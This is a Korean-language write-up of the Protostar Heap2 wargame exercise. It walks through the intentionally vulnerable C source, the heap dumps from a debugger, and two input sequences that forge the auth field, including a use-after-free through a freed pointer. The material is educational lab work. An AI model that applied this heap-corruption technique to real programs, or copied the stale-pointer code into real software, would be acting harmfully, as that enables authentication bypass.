# Wargame / Protostar / Heap2

[Protostar Heap2 - Exploit Exercises](https://exploit-exercises.com/protostar/heap2/)

>This level examines what can happen when heap pointers are stale.
>This level is completed when you see the “you have logged in already!” message
>This level is at /opt/protostar/bin/heap2

## Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

struct auth {
  char name[32];
  int auth;
};

struct auth *auth;
char *service;

int main(int argc, char **argv)
{
  char line[128];

  while(1) {
      printf("[ auth = %p, service = %p ]\n", auth, service);

      if(fgets(line, sizeof(line), stdin) == NULL) break;

      if(strncmp(line, "auth ", 5) == 0) {
          auth = malloc(sizeof(auth));
          memset(auth, 0, sizeof(auth));
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
      }

      if(strncmp(line, "reset", 5) == 0) {
          free(auth);
      }

      if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }

      if(strncmp(line, "login", 5) == 0) {
          if(auth->auth) {
              printf("you have logged in already!\n");
          } else {
              printf("please enter your password\n");
          }
      }
  }
}
```

## Initial Execution

```bash
$ ./heap2
[ auth = (nil), service = (nil) ]
auth
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x89f7818, service = (nil) ]
login
please enter your password
[ auth = 0x89f7818, service = (nil) ]
service BBBB
[ auth = 0x89f7818, service = 0x89f7828 ]
reset
[ auth = 0x89f7818, service = 0x89f7828 ]
service
[ auth = 0x89f7818, service = 0x89f7818 ]
login
please enter your password
[ auth = 0x89f7818, service = 0x89f7818 ]
...
```

처음에는 이 문제가 원하는 것이 뭔지 잘 모르다가 ~~몇 가지 writeup 을 읽어본 후~~ 이해하기로는 ...

- `auth` : 유저 입력 값을 `alloc` 하여 copy 한 다음 alloc pointer return.
- `reset` : alloc 했었던 `auth` free.
- `service` : `strdup` 함수 이용해서 유저가 입력한 string 을 `alloc` 한 후 string copy 한 후에 alloc pointer return.
- `login` : 최종적으로는 `auth->auth` 값을 설정하여 `login` 하여 `you have logged in already!` 출력.

## Analysis

#### stdin 입력

`auth` 의 경우에는 `strcpy` 시의 source address 가 `line+5` 부터이므로 입력을 `auth AAAA` 식으로 넣어야 하고

```c
          if(strlen(line + 5) < 31) {
              strcpy(auth->name, line + 5);
          }
```

`service`의 경우에는 `strcpy`시의 source address 가 `line+7` 부터이므로 입력을 `serviceBBBB` 식으로 입력해야 한다.

```c
      if(strncmp(line, "service", 6) == 0) {
          service = strdup(line + 7);
      }
```

#### Code Error ?

`auth AAAA` 이후에 `serviceBBBB` 입력을 하였는데, `auth` 시에 16bytes, `service` 시에 16 bytes 할당됨. `sizeof(auth)` 만큼 `alloc` 받았으면 `32+4 = 36` bytes 할당 받는 것이 받을 것 같은데 이상하게도 `8` bytes 가 할당됨.

```
pwndbg> r
Starting program: /wargame/protostar/heap/heap2/heap2
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c818, service = (nil) ]
serviceBBBB
[ auth = 0x804c818, service = 0x804c828 ]

pwndbg> x/50x 0x804c800
0x804c800:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c810:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804c820:      0x00000000      0x00000011      0x42424242      0x0000000a
0x804c830:      0x00000000      0x000007d1      0x00000000      0x00000000
0x804c840:      0x00000000      0x00000000      0x00000000      0x00000000
```

liveoverflow 동영상에서도 여러 변수들이 `auth` 동일 이름을 사용하고 있어서 좀 문제가 있다고 설명하고 있네요...

#### How to exploit

실제 사이즈보다 alloced 된 영역은 작지만 `auth->auth` 해석 시에는 structure 의 크기에 맞추어서 해석이 되어 `auth->auth` 값 (`0x804c818` + `32` = `0x804c838`)은 `0` 이다.

```
gef)  x/50x 0x804c800
0x804c800:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c810:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804c820:      0x00000000      0x00000011      0x42424242      0x0000000a
0x804c830:      0x00000000      0x000007d1      0x00000000      0x00000000
0x804c840:      0x00000000      0x00000000      0x00000000      0x00000000

gef)  print auth
$1 = (struct auth *) 0x804c818
gef)  print *auth
$2 = {
  name = 0x804c818,
  auth = 0x0
}
```

## Exploit

#### Exploit1 : `service` 를 통해서 여러번 alloc

`auth` 입력 이후에 `service` 를 여러번 수행해서 `0x804c838` 에 값을 쓴다음에 `login` 수행.

```
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c818, service = (nil) ]
serviceBBBB
[ auth = 0x804c818, service = 0x804c828 ]
serviceCCCC
[ auth = 0x804c818, service = 0x804c838 ]

gef)  x/50 0x804c800
0x804c800:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c810:      0x00000000      0x00000011      0x41414141      0x0000000a
0x804c820:      0x00000000      0x00000011      0x42424242      0x0000000a
0x804c830:      0x00000000      0x00000011      0x43434343      0x0000000a
0x804c840:      0x00000000      0x000007c1      0x00000000      0x00000000
0x804c850:      0x00000000      0x00000000      0x00000000      0x00000000

gef)  print auth
$5 = (struct auth *) 0x804c818
gef)  print *auth
$6 = {
  name = 0x804c818,
  auth = 0x43434343
}
```

```
login
you have logged in already!
[ auth = 0x804c818, service = 0x804c838 ]
```


#### Exploit2 : `use-after-free` exploit

원래 이 문제는 heap exploit 이므로 `user-after-free` exploit 로 푸는 것이 정석이 아닐까 ?

`auth` pointer 가 `alloc` -> `free` 한 이후에도 alloced pointer 값을 clear 하지 않고 계속 참조를 하면서 사용을 하고 있다. `free` 한 이후에 `service` 통하여 alloc 을 계속 하면 `0x804c838` 영역을 write 할 수 있다.

```
[ auth = (nil), service = (nil) ]
auth AAAA
[ auth = 0x804c818, service = (nil) ]
reset
[ auth = 0x804c818, service = (nil) ]
serviceBBBB
[ auth = 0x804c818, service = 0x804c818 ]
serviceCCCC
[ auth = 0x804c818, service = 0x804c828 ]
serviceDDDD
[ auth = 0x804c818, service = 0x804c838 ]

gef)  x/50x 0x804c800
0x804c800:      0x00000000      0x00000000      0x00000000      0x00000000
0x804c810:      0x00000000      0x00000011      0x42424242      0x0000000a
0x804c820:      0x00000000      0x00000011      0x43434343      0x0000000a
0x804c830:      0x00000000      0x00000011      0x44444444      0x0000000a
0x804c840:      0x00000000      0x000007c1      0x00000000      0x00000000
0x804c850:      0x00000000      0x00000000      0x00000000      0x00000000

gef)  print auth
$7 = (struct auth *) 0x804c818
gef)  print *auth
$8 = {
  name = 0x804c818,
  auth = 0x44444444
}
```

```
login
you have logged in already!
[ auth = 0x804c818, service = 0x804c838 ]
```


## Great Explanation

<iframe width="853" height="480" src="https://www.youtube.com/embed/ZHghwsTRyzQ" frameborder="0" allowfullscreen></iframe>
